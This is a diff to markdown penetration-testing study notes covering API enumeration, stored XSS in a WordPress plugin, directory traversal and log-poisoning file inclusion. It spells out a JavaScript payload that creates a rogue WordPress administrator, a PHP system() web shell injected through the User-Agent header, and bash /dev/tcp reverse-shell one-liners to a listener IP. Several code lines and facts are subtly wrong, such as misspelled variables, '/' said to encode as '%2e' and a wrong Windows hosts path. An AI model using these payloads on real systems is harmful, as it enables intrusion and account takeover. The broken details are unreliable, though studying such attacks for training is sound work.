@@ -1,9 +1,8 @@
-	qThis learning module contains:
+This learning module contains:
 
 1.  Web application assessment methodology;
 2.  Web application enumeration; and
 3.  Cross-site scripting.
-
 ## Web application assessment methodology
 This learning module contains;
 
@@ -83,9 +82,7 @@ The robots.txt contains the pages which bots can and cannot access.  They are re
 # this obtains the robots.txt for google.com
 
 curl https://google.com/robots.txt
-
 ~~~
-
 ### Enumerating and abusing APIs
 API are essentially access points to functions and data, which are built and deployed for machine to machine integration.
 
@@ -93,7 +90,6 @@ API are essentially access points to functions and data, which are built and dep
 # api are accessed with the following structure
 
 https://api_name/v1/
-
 ~~~
 
 Conventional tools like 'gobuster' can be used to identify API endpoints, which includes a 'pattern' function (-p). 
@@ -110,7 +106,6 @@ gobuster dir -u <IP> -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
 
 /books/v1
 /users/v1
-
 ~~~
 
 We can inspect the API by using the curl function:
@@ -132,7 +127,6 @@ gobuster dir -u https://<IP>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.
 curl -i https://<IP>/users/v1/admin/password
 
 # this results in a '405 method not allowed'.  This suggests that the endpoint exists.  By default, the curl command uses the 'GET' method (which is not allowed).  
-
 ~~~
 ## Steps
 Fix this
@@ -168,7 +162,6 @@ function multiplyValues(x,y) {
 
 let a = multiplyValues(3,5)
 console.log(a)
-
 ~~~
 #### Identifying XSS vulnerabilities
 We can find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitised input, which is then displayed as output in subsequent pages.
@@ -179,13 +172,11 @@ Once we identify an entry point, we can input special characters and observe the
 # the most common special characters are
 
 < > ' " { } ;
-
 ~~~
 #### Basic XSS
 In this example we will exploit a known vulnerability in a Wordpress plugin called 'visitors'.  The plugins main feature is to log the websites visitor data, including the IP, source and User-Agent fields.  The source code for the plugin can be downloaded from its website.  If we inspect the database.php file, we verify how the data is stored inside the Wordpress database.
 
 ~~~ php
-
 function VST_save_record() {
 	global $wpdb;
 	$table_name = $wpdb->prefix . 'VST_registros';
@@ -217,7 +208,7 @@ User-Agent:<script>alert(42)</script>
 Rather than recording this data, it runs the arbitrary code and displays the message block on the sites page. 
 #### Session cookies
 With XSS we can steal session cookies and session information if the application uses and insecure session management configuration.  If we can steal an authenticated users session cookie we can masquerade as that user within the target web site.  
-Websites use cookies to track state and information about users.  Cookies can be set with several optional flags, including two that are particularly interesting to us as pen tester:  Secure and HTTPOnly.
+Websites use cookies to track state and information about users.  Cookies can be set with several optional flags, including two that are particularly interesting to us as pen tester:  Secure and HTTP Only.
 
 The secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS.  This protects the cookie from being send in clear text and captured over the network.
 
@@ -229,15 +220,12 @@ This new attack angle which is to fetch the WordPress admin nonce.  The nonce is
 The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.
 
 ~~~ html
-
 <a href="http://fakecryptonbank.com/send_btc?account=ATTACKER&amount=1000000"">Check out these awesome cat memes!</a>
-
 																			  ~~~
 
 In order to use an exploit above, we need to obtain the WordPress nonce.
 
 ~~~ js
-
 // using JS to obtain the WordPress nonce.
 
 var ajaxRequest = new XMLHttpRequest();
@@ -247,13 +235,11 @@ ajexRequest.open("GET", requestURL, false);
 ajaxRequest.send();
 var nonceMatch = nonceRegex.exec(ajaxRequest.responceText);
 var nonce = nonceMatch[1];
-
 ~~~
 
 Now that we have the WP nonce we can craft the main function responsible for creating the new admin users.
 
 ~~~ js
-
 // creating the new wordpress admin user
 
 var params = "action=createuser&_wpnonce_create-user="+nonce+"& user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
@@ -261,13 +247,11 @@ ajaxRequest =  new XMLHttpRequest();
 ajaxRequest.open("POST", requestURL, true);
 ajaxRequest.setRequestHeader("Content-Type)", "application/x-www-form-urlencoded");
 ajaxRequest.send(params);
-
 ~~~
 
 Finally we need to encode the minified JavaScript code, so any bad characters wont interfere with sending the payload.  We can do this using the following function.
 
 ~~~ js
-
 function encode_to_javascript(string){
 	var input = string;
 	var output = '';
@@ -282,17 +266,13 @@ function encode_to_javascript(string){
 let encode = encode_to_javascript('insert_minified_javascript')
 console.log(encoded)
 ~~~
-
-
 ## Directory Traversal
 In this section, we will understand what a directory traversal vulnerability is, how it can be identified and exploited.  It is also useful to know how to correct the vulnerability.
-
 ### Absolute and relative paths
 The easiest way to understand the difference between absolute and relative paths is to visualise the location of a file system as if you were in it.  A relative path is the directions that you would take to get from where you are to where you need to be i.e. the directions are based on where you are.  An absolute path is the location/directions to the location you want to go  from the root directory.
 
 ~~~ bash
 # if Im in the home directory "/home/kali" and I want to get to the 'Downloads' direcotry I would use the command below.
-
 pwd
 /home/kali
 cd Downloads
@@ -310,28 +290,83 @@ cd /home/kali/Downloads
 
 # this works as we specify the directions to the 'Downloads' directory from a know position.  In this case, the root direcotry
 ~~~
-
 ### Identifying and exploiting directory traversals
 These types of exploits are generally caused by developers not sanitising user input.  When a web application shows a web page, that file is retrieved from the file system.  These files are generally stored in the web-server root directory or one if its sub-directories.  On Linux based web-servers, the 'var/www/html' directory is frequently used as the web root directory.  
 When a web application serves a page 'http://www/example.com/file.html' it will access the 'file.html' from the '/var/www/html/file.html' directory.  
 A web application is susceptible to a directory traversal exploit when file outside of the web-root can be accessed using a relative path.  A directory traversal using relative paths can be used to access sensitive files including SSH private keys or configuration files.
 
 It is important to examine all of the links on a page to identify directory traversal vulnerabilities.
-
 ~~~ bash
-
 https://example.com/cms/login.php?language=en.html
-
 ~~~
-The URL above shows that a language parameter accepts 'en.html'.  If we try the following url we can confirm if a 'en.html' exists.
+The URL above shows that a language parameter accepts 'en.html'.  If we try the following URL we can confirm if a 'en.html' exists.
+~~~ bash
+https://example.com/cms/en.html
+~~~
+If this loads the page, we know that the 'en.html' is a file on the server, which means we can use the parameter to try other file names. 
+'It is very useful to examine parameters closely when they use files as a value'.
+The URL indicates that the site uses a 'CMS' and the files for this are located in a sub-directory of the web root.
+On Linux systems it is a simple process to confirm directory traversal vulnerability by trying to read the 'passwd' file, which is located at '/etc/passwd'.  If this is available, we can check for SSH private keys by including '/home/offsec/.ssh/id_rsa'.
+Once a vulnerability has been identified, we should avoid using web browsers for exploitation or exploration and instead utilise Burp-suite, cURL or a scripting/programming language of choice. 
+A private SSH key can be copied into a text file and then used to connect to the target using SSH.
+#### On Windows
+On a Windows system, the '/etc/passwd'  isn't there.  Instead, 'C:\Windows\System32\drivers\hosts\' can be used to test for a directory traversal vulnerability.
+#### Character encoding
+When directory traversal vulnerabilities exist, these can be mitigated by filtering user input.  This would likely include filtering out sequences of characters that are used to traverse directories i.e. '/../../../'.  These can be bypassed by utilising character (percent) encoding.  Characters like '/' can be encoded as '%2e'.  These are essentially the same thing, however, the later won't be stopped by the filtering.
+#### Local file inclusion
+In contrast with directory traversal vulnerabilities, a file inclusion vulnerability allows us to include files inside an applications running code.  Directory traversal only allows us to read the contents of files.  
+As an example, if a directory traversal vulnerability allows us to read the contents of a PHP file, where a file inclusion vulnerability would allow us to execute a PHP file.
+Remote Code Execution (RCE) can be obtained by using a technique called 'log poisoning' (LP).  LP works by modifying data we send to a web application so that the log contains executable code.  In this scenario, if the file we include contains executable code it will be executed.  
+As an example, we can write executable code to the 'access.log' file in the '/var/log/apache2/' directory. 
+To do this we first need to understand what is included in a log entry by using a directory traversal exploit to view the 'access.log' file.  We can do this using the cURL command.
+~~~ bash
+# this will show the contents of the access.log file
+curl http://application.com/subdirectory/index.php?page=../../../../../../../../../var/log/apache2/access.log
+~~~
+The contents of this file, shows that the 'user agent' is included in the access.log file.  We can use Burp-Suite to change what is in the 'user agent'.  Effectively, we add executable code in the 'user agent'.
 
 ~~~ bash
+### HTTP HEADER ###
+GET /meteor/index.php?page=admin.php HTTP/1.1
+Host: mountaindesserts.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/ Firefox/91.0
 
-https://example.com/cms/en.html
-
+### MODIFIED HTTP HEADER ###
+GET /meteor/index.php?page=admin.php HTTP/1.1
+Host: mountaindesserts.com
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
 ~~~
-If this loads the page, we know that 
+Modifying the HTTP header as above, includes executable PHP code in the access.log file.  We can then update the HTTP page parameter to execute the included PHP code.
 
+~~~ bash
+### HTTP HEADER ###
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
+Host: mountaindesserts.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/ Firefox/91.0
+~~~
+The two changes above provide the capacity to run any shell command.  The first change to the HTTP header includes PHP code in the access.log file.  This code uses PHP to run a shell command.  The second change is to utilise the directory traversal vulnerability to both pass an argument to the PHP code in the access.log file and run it.  In this instance, that argument is to run the shell 'ps' command, which lists running processes.  This command could be anything, including 'cat /etc/passwd', but may require character encoding where there is white space included.
+It is best to use Burp-suite and the repeater feature to modify HTTP headers.
+##### RCE Reverse shell
+~~~ bash
+# these are shell based reverse shell code snippets
+# not supported by bourne shell
+# host IP and Port (192.168.119.3/444)
+bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
+
+# supported by bourne shell
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+
+# with character encoding
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+
+# netcat listiner
+nc -nvlp 4444
+~~~
+### PHP wrappers
+PHP wrappers can be thought of a code library that can interact with external services or other APIs. 
+We will only examine the 'filter' and 'data' wrappers in this section, however, there are many wrappers available.
+
+The examples below show how the wrappers can be used to reveal the underlying PHP files.
 ### OS Command Injection
 Web applications frequently need to interact with the underlying OS to undertake routine tasks like interacting with the file system.  Web applications should provide a specific API with prepared commands to interact with the OS which cannot be changed by user input.  These however are time consuming to create and maintain.  
 Frequently, developers rely on user input and then sanitise.  This means that user input is filtered cor any command sequences that might try to change the application's behavior.
